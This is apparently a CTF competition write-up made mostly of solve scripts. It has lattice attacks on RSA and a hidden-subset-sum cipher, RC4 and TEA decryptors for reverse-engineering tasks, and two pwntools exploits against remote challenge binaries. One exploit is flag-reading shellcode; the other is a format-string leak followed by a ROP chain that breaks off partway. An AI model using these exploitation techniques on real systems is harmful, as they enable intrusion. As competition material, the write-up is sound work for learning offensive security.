86362463246536854074326339688321361763048758911466531912202673672708237653371439192187048224837915338789792530365728395528053853409289475258767985600884209642922711705487919620655525967504514849941809227844374505134264182900183853244590113062802667305254224702526621210482746686566770681208335492189720633162'''
from not2022but2024 import CBC_keyfrom Crypto.Util.Padding import pad
flag = b'flag{}'from Crypto.Cipher import AESfrom hashlib import sha256import random
n = 31m = 80M = random_prime(2^256)As = [random.randrange(0,M) for i in range(n)]xs = [random_vector(GF(2),m).change_ring(ZZ) for i in range(n)]Bs = sum([As[_] * vector(Zmod(M),xs[_]) for _ in range(n)]).change_ring(ZZ)
IV = sha256(str(int(sum(As))).encode()).digest()[:16]aes = AES.new(CBC_key,AES.MODE_CBC,iv=IV)cipher = aes.encrypt(pad(flag,16))print(cipher)print(Bs)print(M)
"""b'%x97xf77x16.x83x99x06^xf2h!kxfaN6xb0x19vd]x04Bx9e&xc1Vxedxa3x08gXxb2xe3x16xc2yxf5/xb1x1f>xa1xa0DOxc6gyxf2lx1exe89xaeUxf7x9dx03xe5xcd*{'(53844623749876439509532172750379183740225057481025870998212640851346598787721, 15997635878191801541643082619079049731736272496140550575431063625353775764393, 8139290345909123114252159496175044671899453388367371373602143061626515782577, 51711312485200750691269670849294877329277547032926376477569648356272564451730, 56779019321370476268059887897332998945445828655471373308510004694849181121902, 11921919583304047088765439181178800943487721824857435095500693388968302784145, 41777099661730437699539865937556780791076847595852026437683411014342825707752, 68066063799186134662272840678071052963223888567046888486717443388472263597588, 62347360130131268176184039659663746274596563636698473727487875097532115406559, 5552427086805474558842754960080936702720391900282118962928327391068474712240, 48174546926340119542515098715425118344495523250058429245324464327285482535849, 8793683612853105242264232876135147970346410658466322451040541263235700009570, 78872313670499828088921565348302137515276635926740431961166334829533274321063, 45986964918902932699857479987521822871519141147943250535680974229322816549720, 5539445840707805914548390575494054384665037598195811353312773359759245783130, 20826977782899762485848762121688687172338304931446040988601154085704702880401, 46412211529487215742337744878389285037116176985579657423264681199244501574725, 50741521861819713251561088062479658512988690918747542471827101566427731303416, 2657362476409491643067267745198536051013594201408763262228104521443406410606, 44328850588851214219220815931558890597249087261312360172796979417041192180750, 17240480010040498121198897919561403023278264974274103780966819232080038065027, 76464770903606818697905572779761942703446600798395362596698226797476804541350, 68085613496380272855135907856973365357126900379731050931749074863934645465000, 9526872466819179025323613184178423510032119770349155497772862700507205270355, 28561337010953007345414455535991538568670238712225998300322929406204673707677, 39182834208152122329027105134597748924433413223238510660062164011424607149326, 19600894094417831727934201861135428039216930531542618497625138063955073257655, 33328666355366104030800248593757531247937582259417117239494927842284231531315, 27309478993506749161736165865367616487993717640890015043768259212155864131357, 32466044572968154084881296026899630667525833604042642990295342316076396001186, 49980145403553319854613749104421978583845098879328180142454823188167202440531, 38902032967058543060885229430655776526806612465844770409338358289020456837934, 78745490507168848644435092323691842070096557975478968062804777954092505226481, 29262215059225133132435433010691828148944958395141222387754208495595513295896, 6511387460586172200641169204557875679554320457409786241141816573577911255491, 66384481485687195909117407019475796131750762463683904604078327730810293442381, 423759905526048383541413041558602466949757468395447771021215945027193456079, 22783408973585275782090957855992582495700723663661365548067357177569979041893, 68353193576625297253561095680880135893826094396013897100461325445097220567952, 43167069172003777333498030236780725018297276760410131777676641770086016833895, 64358541048274393300028483577573557871346089755363306971761786692679519831483, 21556895066359380729591004278007242407987861350911480029337345312081293559522, 44577165826706395273335181181407938788716768576602201516787959082367484270939, 78757778436852423927977028333940102206341452120720821559562765928972163293676, 44086875063535769349025637423479101247594814134304419072849625465484225865969, 14807706619359620049095657244485266549982349493285112282927264862821502986777, 43450687889967222089875050731849984583914520350091026482076939962301357700844, 1474778474197964170746922000689413626959960404877093741742022788928758658052, 79005121352540562329295808987757987563818908122338120731119811866179839023066, 47361429831079185336051370209844150786334814579472466274050224935364333043476, 8909641306798261411104006708035991379862284048887418817598377473145077145642, 44993528669446910461207972446344484798499156885515181685694150462051560323869, 60204243272925546012169935228277233636280408169577344559847112958669050860101, 66809206609934431859673802937592425152676610053648406215573441926481740948749, 48623757302381792245138496825183044619235050623516633984941208604059757210728, 74934019261870654132458355068539987475536823529848461398042458398130801089348, 81278897734052917585963333108338812132716202790194259021265555401046891572210, 41418370274745377550600009352057265922713132669834032188979684042175922204024, 73981010754794931896065529724613353453372905938901875720094092383581574259191, 11510558496830929812186594415924901190526760075439658941646537744390447056913, 12871197940932509721689273944282764851472299179520294551038550766143300003239, 13125880938267970248643653453332470640527994428672724309079849030361661332656, 54395419708886945822916038876690794705789028459055268227222784885329659953982, 61086065362549289820758257234061183781820530343096737751500151263095654158833, 82468574289042215923908109910435173164917593677419944115441863191433795206895, 74824772928304750096519403623184368585460834399443013973554958461695733158569, 62083272769549467370505302454770858941632031970595402929903886003242570089639, 32887658447648473554892464271221330218759930615421257444587260809741011575629, 61429802749826163386356730793012182546392982886506956044525858721859869425131, 5026334434650853992374810127604777276035123569907012144091150436739161826287, 45670628392162402176230172863069957038704667046592086395237022845943911838596, 75520245720261510582172547313413372786802547571090110489287163846652239401646, 58965653594414801363386215405590061806834352303047020261264473838037335631061, 58420763657138617301836404602193276258504426799372302098717637069900583548539, 59706321905964570794806865247363209194143775670139452625484601579677510881069, 58198559234141523043769073193017418608700536234755760366044515212056701655389, 63604949023865770163110419193113341020042474142600282131130750460724114084001, 83394429495100363085521124642271430199140318544724150468993097819105267094727, 69274794456073656789648159458959148992942789823222968847070524400609637893875, 46951397339712109206750633799342393646147684284310708226074432825222250739146)83509079445737370227053838831594083102898723557726396235563637483818348136543"""
```



```
https://tanglee.top/2023/12/12/Orthogonal-Lattice-Attack/
```



```
https://github.com/tl2cents/Implementation-of-Cryptographic-Attacks/blob/f83d71d8fe83e01ba6a684965cef61861437ff23/MultivariateHSSP/A%20Polynomial-Time%20Algorithm%20for%20Solving%20the%20Hidden%20Subset%20Sum%20Problem.ipynb
```



```
from sage.all import *from Crypto.Util.number import *from gmpy2 import *from sage.matrix.matrix2 import Matrix as Matrix2import timefrom collections.abc import Iterablefrom sage.modules.free_module_integer import IntegerLatticeimport time
#part 1n = 104765768221225848380273603921218042896496091723683489832860494733817042387427987244507704052637674086899990536096984680534816330245712225302233334574349506189442333792630084535988347790345154447062755551340749218034086168589615547612330724516560147636445207363257849894676399157463355106007051823518400959497h = 7203581190271819534576999256270240265858103390821370416379729376339409213191307296184376071456158994788217095325108037303267364174843305521536186849697944281211331950784736288318928189952361923036335642517461830877284034872063160219932835448208223363251605926402262620849157639653619475171619832019229733872640947057355464330411604345531944267500361035919621717525840267577958327357608976854255222991975382510311241178822169596614192650544883130279553265361702184320269130307457859444687753108345652674084307125199795884106515943296997989031669214605935426245922567625294388093837315021593478776527614942368270286385c = 86362463246536854074326339688321361763048758911466531912202673672708237653371439192187048224837915338789792530365728395528053853409289475258767985600884209642922711705487919620655525967504514849941809227844374505134264182900183853244590113062802667305254224702526621210482746686566770681208335492189720633162N = n**2 + 2024
a = int(pow(3, 2022, N))b = int(pow(5, 2022, N))T = 2^2048
pbit = 5qbit = 5
for lp in range(2**pbit): for lq in range(2**qbit): hh = h - a*lp - b*lq L = matrix(ZZ,4,4,[[1,0,T*a*2**pbit,0], [0,1,T*b*2**qbit,0], [0,0,T*N,0], [0,0,T*hh,N] ]) res = L.LLL() for row in res: if abs(row[-1]) == N: p = gcd(n,abs(row[0])*2**pbit+lp) q = gcd(n,abs(row[1])*2**qbit+lq) if p>1 or q>1: print("p=",p) print("q=",q) phi = (p - 1)*(q - 1) d = invert(65537,phi) m = pow(c,d,n) print(long_to_bytes(int(m))) break#key = b'mylove_in_summer'
#part 2n = 31m = 80BS=(…)p = 35119411868157074664430974548068674543332670208412768267028980956903083749789
F = GF(p)h = vector(Bs)
#print("h=",h)
def find_ortho_fp(*vecs): assert len(set(len(v) for v in vecs)) == 1 L = block_matrix(ZZ, [[matrix(vecs).T, matrix.identity(len(vecs[0]))], [ZZ(p), 0]]) print("LLL", L.dimensions()) nv = len(vecs) L[:, :nv] *= p L = L.LLL() ret = [] for row in L: if row[:nv] == 0: ret.append(row[nv:]) return matrix(ret)

def find_ortho_zz(*vecs): assert len(set(len(v) for v in vecs)) == 1 L = block_matrix(ZZ, [[matrix(vecs).T, matrix.identity(len(vecs[0]))]]) print("LLL", L.dimensions()) nv = len(vecs) L[:, :nv] *= p L = L.LLL() ret = [] for row in L: if row[:nv] == 0: ret.append(row[nv:]) return matrix(ret)
Mh = find_ortho_fp(h)assert Mh * h % p == 0#print(Mh)
#L = Mh.LLL()#print(L)
Lx = find_ortho_zz(*Mh[: m - n])#print("Lx=",Lx)'''res = Lx.LLL()print(res)alpha = Lx.solve_right(h)print(alpha)'''def allones(v): if len([vj for vj in v if vj in [0, 1]]) == len(v): return v if len([vj for vj in v if vj in [0, -1]]) == len(v): return -v return None

def recoverBinary(M5): lv = [allones(vi) for vi in M5 if allones(vi)] n = M5.nrows() for v in lv: for i in range(n): nv = allones(M5[i] - v) if nv and nv not in lv: lv.append(nv) nv = allones(M5[i] + v) if nv and nv not in lv: lv.append(nv) return Matrix(lv)xs = recoverBinary(Lx)print(xs)
alpha = h*xs.inverse()print(alpha)
```



```
from collections.abc import Iterablefrom sage.modules.free_module_integer import IntegerLatticeimport timefrom Crypto.Cipher import AESfrom hashlib import sha256
# https://github.com/Neobeo/HackTM2023/blob/main/solve420.sagedef flatter(M): from subprocess import check_output from re import findall M = matrix(ZZ,M) # compile https://github.com/keeganryan/flatter and put it in $PATH z = '[[' + ']n['.join(' '.join(map(str,row)) for row in M) + ']]' ret = check_output(["flatter"], input=z.encode()) return matrix(M.nrows(), M.ncols(), map(int,findall(b'-?\d+', ret)))
def gen_hssp(n = 10, m = 20, Mbits = 100): M = random_prime(2^Mbits, proof = False, lbound = 2^(Mbits - 1)) # alpha vectors a = vector(ZZ, n) for i in range(n): a[i] = ZZ.random_element(M)
 # The matrix X has m rows and must be of rank n while True: X = random_matrix(GF(2), m, n).change_ring(ZZ) if X.rank() == n: break
 # Generate an instance of the HSSP: h = X*a % M h = X * a % M return M, a, X, h
# compute kernel space and obtain an LLL-reduced basisdef kernel_LLL(vec_mat, mod=None, verbose=False, w=None): """ Input : vec_mat : m * n matrix, the m vectors are : v1,..., vm in Z^n mod : if mod is not None, we find kernel in Zmod(mod) else in ZZ Output : B : matrix, an LLL-reduced basis b1,b2,...,bk such that bi * vj for all i in [1,k], j in [1,m] """ m, n = vec_mat.dimensions() if mod is None: # if n < 2*m : return vec_mat.right_kernel().matrix() if w is None : w=2^(n//2)* vec_mat.height() M = block_matrix(ZZ, [w * vec_mat.T, 1], ncols = 2).dense_matrix() else: if w is None : w = 2^(ZZ(mod).nbits()) M = block_matrix(ZZ, [ [w * vec_mat.T, 1], [w * mod, 0] ]).dense_matrix() if verbose: print(f" [*] start to LLL reduction with dim {M.dimensions()}") # L = M.LLL() t0 = time.time() L = flatter(M) t1 = time.time() if verbose: print(f" [+] LLL reduction done in {t1 -t0}") # filter orthogonal vectors basis = [] for row in L: if row[:m] == 0: # orthogonal vector basis.append(row[m:m+n]) if verbose: print(f" [+] find {len(basis)} orthogonal vectors for {m} {n}-dim vectors") return matrix(ZZ, basis)
def derive_mod_bits(n): iota=0.035 mod_bits=int(2 * iota * n^2 + n * log(n,2)) return mod_bits

def ol_attack(h, m, n , M, verbose=False): """ HSSP : h = X * a % M Input : h : hssp result m-dim vector m,n : X.dimensions() M : the mod Output: the basis b1, ..., bn generating x1,...,xn (column vectors of X) """ H = matrix(ZZ,h) # we only need m - n generating basis basis = kernel_LLL(H, mod = M, verbose=verbose)[:m - n] # check assert basis * H.T % M == 0, "not kernel, do check" # the basis is orthogonal to x_i in ZZ by assumption # try to recover the basis of xi xi_basis = kernel_LLL(basis, verbose=verbose) return xi_basis

def check_matrix(M, white_list = [1,0,-1]): # check wheter all values in M fall into white_list for row in M: for num in row: if num not in white_list: return False return True
def all_ones(v): if len([vj for vj in v if vj in [0,1]])==len(v): return v if len([vj for vj in v if vj in [0,-1]])==len(v): return -v return None
def recover_binary_basis(basis): lv = [all_ones(vi) for vi in basis if all_ones(vi)] n = basis.nrows() for v in lv: for i in range(n): nv = all_ones(basis[i] - v) if nv and nv not in lv: lv.append(nv) nv = all_ones(basis[i] + v) if nv and nv not in lv: lv.append(nv) return matrix(lv)
def find_original_basis(basis, new_basis): n, m = basis.dimensions() origin_lattice = IntegerLattice(basis) origin_basis = [] for row in new_basis: if sum(row) == m: continue # seems like we cannot determine wether 1,-1 represents 1 or 0 in this lattcie # therefore we do some checking in the original lattice v = vector(ZZ, [1 if num == 1 else 0 for num in row]) if v in origin_lattice: origin_basis.append(v) else: v = vector(ZZ, [0 if num == 1 else 1 for num in row]) assert v in origin_lattice, "oops, something wrong" origin_basis.append(v) return matrix(ZZ, origin_basis)

def recover_binary_basis_by_lattice(basis, blocksize = None): new_lattice = 2 * basis n, m = basis.dimensions() new_lattice = new_lattice.insert_row(0, [1] * m) if blocksize is None: # new_basis = new_lattice.LLL() new_basis = flatter(new_lattice) else: new_basis = new_lattice.BKZ(block_size = blocksize)
 if not check_matrix(new_basis, [1,-1]): print("[+] fails to recover basis") return None
 origin_lattice = IntegerLattice(basis) origin_basis = [] for row in new_basis: if sum(row) == m: continue # seems like we cannot determine wether 1,-1 represents 1 or 0 in this lattcie # therefore we do some checking in the original lattice v = vector(ZZ, [1 if num == 1 else 0 for num in row]) if v in origin_lattice: origin_basis.append(v) else: v = vector(ZZ, [0 if num == 1 else 1 for num in row]) assert v in origin_lattice, "oops, something wrong" origin_basis.append(v) return matrix(ZZ, origin_basis)
# Nguyen-Stern attack using greedy method mentioned in appendix D of https://eprint.iacr.org/2020/461.pdfdef ns_attack_greedy(h, m, n, M, bkz = range(2,12,2), verbose=True): t0 = time.time() if verbose: print(f"[*] start to ns attack with greedy method") xi_basis = ol_attack(h, m, n, M) assert isinstance(bkz, Iterable), "give a list or iterable object as block_size para" L = xi_basis if verbose: print(f" [+] basis dimensions : {L.dimensions()}") assert L.dimensions() == (n,m) , "basis generating xi's is not fully recovered" for bs in bkz: if verbose: print(f" [*] start to BKZ reduction with block_size {bs}") L = L.BKZ(block_size = bs) if verbose: print(f" [+] BKZ reduction with block_size {bs} done") if check_matrix(L,[-1,1,0]): if verbose: print(" [+] find valid basis") break
 XT = recover_binary_basis(L) if verbose: print(f" [+] Number of recovered xi vectors {XT.nrows()}") if XT.nrows() < n: print(f" [+] not enough xi vectors recovered, {XT.nrows()} out of {n}") print(f" [*] trying new lattice recovery...") XT = recover_binary_basis_by_lattice(L) if XT.nrows() < n: print(f"[+] failed.") return False, L X = XT.T # h = X * a a = matrix(Zmod(M) ,X[:n]).inverse() * vector(Zmod(M),h[:n]) t1 = time.time() if verbose : print(f" [+] total time cost in {t1 - t0}") return True, a
# Nguyen-Stern attack using 2*Lx + E lattice methoddef ns_attack_2Lx(h, m, n, M, bkz = range(2,12,2), verbose=True): t0 = time.time() if verbose: print(f"[*] start to ns attack with 2*Lx + E method") xi_basis = ol_attack(h, m, n, M) assert isinstance(bkz, Iterable), "give a list or iterable object as block_size para" # we use the new lattice : 2 * basis + [1, ..., 1], the final vectors all fall into [-1, 1] L = 2 * xi_basis L = L.insert_row(0, [1] * m) if verbose: print(f" [+] basis dimensions : {L.dimensions()}") assert L.dimensions() == (n + 1, m) , "basis generating xi's is not fully recovered" for bs in bkz: if verbose: print(f" [*] start to BKZ reduction with block_size {bs}") L = L.BKZ(block_size = bs) if verbose: print(f" [+] BKZ reduction with block_size {bs} done") if check_matrix(L,[-1,1]): if verbose: print(" [+] find valid basis") break
 XT = find_original_basis(xi_basis, L) if verbose: print(f" [+] Number of recovered xi vectors {XT.nrows()}") if XT.nrows() < n: return False, L X = XT.T # h = X * a a = matrix(Zmod(M) ,X[:n]).inverse() * vector(Zmod(M),h[:n]) t1 = time.time() if verbose : print(f" [+] total time cost in {t1 - t0}") return True, a
if __name__ == "__main__": n = 31 m = 80 #Mbits = derive_mod_bits(n) #M, a, X, h = gen_hssp(n, m, Mbits) h = (…) M = 83509079445737370227053838831594083102898723557726396235563637483818348136543 key = b'mylove_in_summer' enc = b'%x97xf77x16.x83x99x06^xf2h!kxfaN6xb0x19vd]x04Bx9e&xc1Vxedxa3x08gXxb2xe3x16xc2yxf5/xb1x1f>xa1xa0DOxc6gyxf2lx1exe89xaeUxf7x9dx03xe5xcd*{' find, recovered_a = ns_attack_greedy(h, m, n, M, range(2,32,4)) if find: #print(f"[+] check {sorted(a) == sorted(recovered_a)}") print("sa=",sorted(recovered_a)) As = sorted(recovered_a) print("As=",As) Ks = [1711700737596942098141587005897001923467148527501577453789847339309231014017, 5875188077052480648232418600824969595720497866536009964666718026546377402659, 7424747337670606381224459936040537522272415300965552412233924440467013214929, 8925537770455527862314319644047361428098122679784046750260385465279524640758, 9410411882949099686377523275038221900647373498185543944914937627443580777895, 9818277845057785226128434266733702357140476441767426182691949404574739864471, 10681847555461399902210862175396453305202670534308493529688939268141672580198, 13437578070400039871447629276288782597377013054748122396902167721942284558085, 14688963368014138891742867302197417412347255697512170452902543642849457063220, 16065558341593994678278335676072994953750074623151334988183861626283964758705, 24109852473418884476019504643346847100268787657659745204234606030014282828985, 24971016647756767660198603093800996644347858001073386304943043863175784231084, 28393466379196565996737944366258699998436604896580168639374332657489975464601, 31428070075963288077422965654196305405378386092416488300386029039813403199212, 32693886981999180270054401707859285735740758568756949747151570025510492214617, 39971965328389179006201634509526724734245000895147926249125775373526091102708, 49134062274507301776274599170938642488704463744351451702654137784332525774376, 49167114207020052222521184151837367841356631663358176773402293991474159882092, 50677991534126079994158927773953299589065239762692927522732479082145177237596, 52681041949334573767794493491168964159221887007215214120559489821086961661278, 57069373872527795267207764660002470738840662888561030895771185521877196347825, 57926274006695718443248286140826994828819362097860891625687150766841503445227, 58567580672456602209669909439188074270723927891214333393676636128662696332054, 58654160939328990050906600214380469574397498119226424016406604809243380684046, 62191998503348002721549751412603698438420814449668296521249993454538200533849, 65958758207359528976256822298643817856263524606065102965597229913330035994172, 67885972767109670871569234926960013411787540132588293510655488187382461618010, 67999012738218701522977745292109516246796839155910592855105830602143310667902, 69578685261396434570248312667766841687942842366772423045805690348363579870605, 70138755870390268278868165128339271231922657556544777400641203083834855251118, 73103831846627154164474136146117846817277939030067244588920096997142184355333] print(As==Ks)
 IV = sha256(str(int(sum(Ks))).encode()).digest()[:16] print("IV=",IV) aes = AES.new(key,AES.MODE_CBC,iv=IV) print(aes.decrypt(enc)) #print("a=",sorted(a)) print()
 find, recovered_a = ns_attack_2Lx(h, m, n, M, range(2,32,4)) if find: #print(f"[+] check {sorted(a) == sorted(recovered_a)}") print("sa=",sorted(recovered_a)) print(len(recovered_a))         print()
```



```
flag{2024_1s_a_G00d_year_My_b3st_w1shes_fOr_ctfers}
```



```
# Source Generated with Decompyle++# File: snack.pyc (Python 3.8)
import pygameimport randomimport key
def initialize(key): key_length = len(key) S = list(range(256)) j = 0 for i in range(256): j = (j + S[i] + key[i % key_length]) % 256 S[i] = S[j] S[j] = S[i] return S

def generate_key_stream(S, length): i = 0 j = 0 key_stream = [] for _ in range(length): i = (i + 1) % 256 j = (j + S[i]) % 256 S[i] = S[j] S[j] = S[i] key_stream.append(S[(S[i] + S[j]) % 256]) return key_stream

def decrypt(data, key): S = initialize(key) key_stream = generate_key_stream(S, len(data)) decrypted_data = None((lambda .0 = None: [ i ^ data[i] ^ key_stream[i] for i in .0 ])(range(len(data)))) # rc4 多异或 一个 i return decrypted_data
pygame.init()WINDOW_WIDTH = 800WINDOW_HEIGHT = 600SNAKE_SIZE = 20SNAKE_SPEED = 20WHITE = (255, 255, 255)BLACK = (0, 0, 0)RED = (255, 0, 0)window = pygame.display.set_mode((WINDOW_WIDTH, WINDOW_HEIGHT))pygame.display.set_caption('贪吃蛇')font = pygame.font.Font(None, 36)snake = [ (200, 200), (210, 200), (220, 200)]snake_direction = (SNAKE_SPEED, 0)food = ((random.randint(0, WINDOW_WIDTH - SNAKE_SIZE) // SNAKE_SIZE) * SNAKE_SIZE, (random.randint(0, WINDOW_HEIGHT - SNAKE_SIZE) // SNAKE_SIZE) * SNAKE_SIZE)key_bytes = bytes((lambda .0: [ ord(char) for char in .0 ])(key.xor_key))data = [ 101, 97, 39, 125, 218, 172, 205, 3, 235, 195, 72, 125, 89, 130, 103, 213, 120, 227, 193, 67, 174, 71, 162, 248, 244, 12, 238, 92, 160, 203, 185, 155]decrypted_data = decrypt(bytes(data), key_bytes)running = Trueif running: window.fill(BLACK) for event in pygame.event.get(): if event.type == pygame.QUIT: running = False elif event.type == pygame.KEYDOWN or event.key == pygame.K_UP: snake_direction = (0, -SNAKE_SPEED) elif event.key == pygame.K_DOWN: snake_direction = (0, SNAKE_SPEED) elif event.key == pygame.K_LEFT: snake_direction = (-SNAKE_SPEED, 0) elif event.key == pygame.K_RIGHT: snake_direction = (SNAKE_SPEED, 0) continue snake_head = (snake[0][0] + snake_direction[0], snake[0][1] + snake_direction[1]) snake.insert(0, snake_head) snake.pop() if snake[0] == food: food = ((random.randint(0, WINDOW_WIDTH - SNAKE_SIZE) // SNAKE_SIZE) * SNAKE_SIZE, (random.randint(0, WINDOW_HEIGHT - SNAKE_SIZE) // SNAKE_SIZE) * SNAKE_SIZE) snake.append(snake[-1]) if snake[0][0] < 0 and snake[0][0] >= WINDOW_WIDTH and snake[0][1] < 0 and snake[0][1] >= WINDOW_HEIGHT or snake[0] in snake[1:]: running = False for segment in snake: pygame.draw.rect(window, WHITE, (segment[0], segment[1], SNAKE_SIZE, SNAKE_SIZE)) pygame.draw.rect(window, RED, (food[0], food[1], SNAKE_SIZE, SNAKE_SIZE)) score_text = font.render(f'''Score: {len(snake)}''', True, WHITE) speed_text = font.render(f'''Speed: {SNAKE_SPEED}''', True, WHITE) window.blit(score_text, (10, 10)) window.blit(speed_text, (10, 40)) score = len(snake) if score >= 9999: flag_text = font.render('Flag: ' + decrypted_data.decode(), True, WHITE) window.blit(flag_text, (10, 70)) pygame.display.update() pygame.time.Clock().tick(10) continuepygame.quit()
```



```
from Crypto.Cipher import ARC4
key = b'V3rY_v3Ry_Ez'
data = [ 101, 97, 39, 125, 218, 172, 205, 3, 235, 195, 72, 125, 89, 130, 103, 213, 120, 227, 193, 67, 174, 71, 162, 248, 244, 12, 238, 92, 160, 203, 185, 155]rc4 = ARC4.new(key)
flag =rc4.decrypt(bytes(data))for i in range(len(flag)): print(chr(flag[i]^i),end='')
```



```
enc = [118, 113, 157, 231, 112, 119, 63, 163, 2, 241, 141, 201, 2, 198, 162, 75, 186, 25, 86, 5, 242, 137, 94, 224]for i in enc: print(hex(i ^ 0x33),end=',')
```



```
#include<stdio.h>#include<stdlib.h>#include<stdint.h>

int main(){ unsigned char enc[] = { 211, 109, 186, 193, 54, 101, 42, 137, 120, 145, 245, 49, 250, 190, 194, 49, 144, 12, 68, 67, 212, 174, 66, 69 }; uint32_t* data = (uint32_t*)enc; uint32_t v15 = 0; uint32_t v13 = 0; uint32_t v14 = 0; for (int i = 0; i < 2; i+=2) { v15 = data[i]; v13 = data[i + 1]; v14 = -0x61CBB648 * 22; for (int j = 0; j < 22; j++) { v13 -= (v14 + v15) ^ (13 + (v15 >> 4)) ^ (8 + 32 * v15); v15 -= (v14 + v13) ^ (5 + (v13 >> 4)) ^ (3 + 32 * v13); v14 += 0x61CBB648; } data[i] = v15; data[i + 1] = v13; } printf("%s", enc);}
```



```
flag{y0u_reallyl1ke_te@}
```



```
#include <stdio.h>#include <string.h>#include <stdint.h>#include <stdlib.h>
void TeaDecrypt(uint32_t *input, uint32_t *key) { unsigned int j; // [esp+4Ch] [ebp-18h] unsigned int v5; // [esp+54h] [ebp-10h] unsigned int v6; // [esp+58h] [ebp-Ch] unsigned int v7; // [esp+5Ch] [ebp-8h]
 for (int i = 0; i < 16; i += 2) { v7 = input[i]; v6 = input[i + 1]; v5 = 0x9E3779B9 * 0x64; for (int j = 0; j < 0x64; j++) { v6 -= (key[(v5 >> 11) & 3] + v5) ^ (v7 + ((v7 >> 5) ^ (16 * v7))); v5 += 0x61C88647; v7 -= (key[v5 & 3] + v5) ^ (v6 + ((v6 >> 5) ^ (16 * v6))); } input[i] = v7; input[i + 1] = v6; }
}
int main(){
 srand(0x1919810u); uint32_t enc[] = { 3036486489, 3653154923, 3598177203, 408905200, 1396350368, 645614189, 1318861428, 3625534240, 3046501746, 1445070236, 2433841867, 213678751, 3463276874, 699118653, 845347425, 3058494644 }; unsigned char rc4[16] = { 0 }; unsigned char tea[16] = { 0 }; for (int i = 0; ; ++i) { if (i >= 16) break; rc4[i] = rand() % 255; tea[i] = rand() % 255; }
 TeaDecrypt(enc, (uint32_t*)tea); unsigned char* temp = (unsigned char*)enc; for (int i = 0; i < 64; i++) { printf("%d,", temp[i]); } printf("n"); for (int i = 0; i < 16; i++) { printf("%d,", (uint8_t)rc4[i]); } return 0;}
```



```
from Crypto.Cipher import ARC4
key = bytes([118,137,51,73,25,19,195,199,173,216,228,104,252,72,4,188])enc = [188,237,0,123,134,244,22,147,149,249,135,220,103,168,162,127,77,226,98,159,123,52,174,233,69,3,126,53,66,208,139,112,240,251,46,199,221,233,185,115,227,204,26,117,173,220,253,20,168,200,69,22,49,110,42,8,44,15,29,159,7,186,213,239]rc4 = ARC4.new(key)print(rc4.decrypt(bytes(enc)))
```



```
from pwn import *
s = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)rl = lambda :io.recvline()ru = lambda delims, drop=True :io.recvuntil(delims, drop)itr = lambda :io.interactive()uu32 = lambda data :u32(data.ljust(4,b'x00'))uu64 = lambda data :u64(data.ljust(8,b'x00'))ls = lambda data :log.success(data)lss = lambda s :log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
context.arch = 'amd64'context.log_level = 'debug'context.terminal = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.RE: return remote('8.147.128.163',29611) else: return process([binary] + argv, *a, **kw)

binary = './Shuffled_Execution'libelf = ''
if (binary!=''): elf = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)
gdbscript = '''#continuebrva 0x001560'''.format(**locals())
io = start(binary)
#gdb.attach(io,gdbscript)pay = b'xebx00' # jmp # x00 截断绕过pay += b'x90' * 0x20pay += asm('add rax,0x800')pay += asm('mov rsp,rax')pay += asm(shellcraft.openat(-100,'/flag'))pay += asm(shellcraft.mmap(0,0x50,7,2,3,0))pay += asm('push 0x60')pay += asm('push rax')pay += asm(shellcraft.writev(1,'rsp',1))sl(pay)
io.interactive()
```



```
from pwn import *
s = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)rl = lambda :io.recvline()ru = lambda delims, drop=True :io.recvuntil(delims, drop)itr = lambda :io.interactive()uu32 = lambda data :u32(data.ljust(4,b'x00'))uu64 = lambda data :u64(data.ljust(8,b'x00'))ls = lambda data :log.success(data)lss = lambda s :log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
context.arch = 'amd64'context.log_level = 'debug'context.terminal = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.RE: return remote('8.147.128.163',28575) else: return process([binary] + argv, *a, **kw)

binary = './SavethePrincess'libelf = ''
if (binary!=''): elf = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)
gdbscript = '''brva 0x000000170Cbrva 0x0166A#continue'''.format(**locals())
io = start(binary)

def magic(data): ru('> n') sl('1') ru('password: n') s(data)

pwd = []over = 0for i in range(8): if over: break for c in range(ord('a'),ord('z')+1): pay = bytes(pwd) + p8(c) pay = pay.ljust(0xA, b'A') magic(pay) d = r(len('you password is')) if b'is' in d: pass else: over = 1 pwd.append(c) print(bytes(pwd)) break #io.recvuntil(' is ',timeout=2) x = ru('n,') print(x) if x[-1] == (i+1): pwd.append(c) print(bytes(pwd)) break print(bytes(pwd))
print(bytes(pwd))

pay = f'%{6+0x7}$p-%{6+9}$p%10$p-'s(pay)ru('0x')can = int(ru('-'),16)ru('0x')libc_base = int(ru('0x'),16) - 171408stack = int(ru('-'),16)
lss('can')lss('libc_base')lss('stack')

ru('> n')sl('2')ru('Attack the dragon!!n')libc.address = libc_baserax = libc_base + 0x0000000000045eb0 #: pop rax ; retrdi = libc_base + 0x000000000002a3e5 #: pop rdi ; retrsi = libc_base + 0x000000000002be51 #: pop rsi ; retrdx = libc_base + 0x000000000011f2e7 #: pop rdx ; pop r12 ; retrcx = libc_base + 0x000000000003d1ee #: pop rcx ; retr8 = libc_base + 0x00000000001659e6 #: pop r8 ; mov eax, 1 ; retr13 = libc_base + 0x0000000000041c4a #: pop r13 ; retr9 = libc_base + 0x00000000000d39d9 #: mov r9, qword ptr [rsp + 0x10] ; call r13 # 虽然 压了一个栈，但是由于减去后 会执行到 sub,rsp, 也会调整栈，r10 = libc_base + 0x0000000000115af4 # mov r10, rcx ; mov eax, 0x104 ; syscall # 这样的也可以用，syscal 执行后不会修改 r10 的值pay = b'flag' + 0x34 * b'x00'pay += p64(can) * 2
pay += p64(rdi)pay += p64((1<<64)-100)pay += p64(rsi)pay += p64(stack-96)pay += p64(libc.sym['openat'])
